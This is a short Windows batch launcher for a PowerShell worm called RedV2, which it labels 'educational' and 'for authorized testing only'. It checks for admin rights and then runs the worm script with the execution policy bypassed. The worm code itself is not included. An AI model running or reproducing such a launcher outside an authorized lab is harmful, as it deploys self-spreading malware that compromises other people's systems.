@echo off
REM RedV2 Launcher - Educational Worm (PowerShell Edition)
REM ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.

echo ===============================================================================
echo RED V2 - ADVANCED EDUCATIONAL WORM LAUNCHER (POWERSHELL EDITION)
echo ===============================================================================
echo ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
echo This launcher will execute the RedV2 PowerShell worm for cybersecurity education
echo in controlled lab environments with proper authorization.
echo ===============================================================================
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [INFO] Running with administrative privileges
) else (
    echo [WARNING] Not running as administrator - some features may be limited
    echo [INFO] Consider running as administrator for full functionality
)

echo.
echo [INFO] Preparing to launch RedV2 PowerShell worm...
echo [INFO] Setting execution policy for current session...

REM Launch PowerShell with bypass execution policy
powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File "RedV2_educational.ps1"

echo.
echo [INFO] RedV2 execution completed
pause 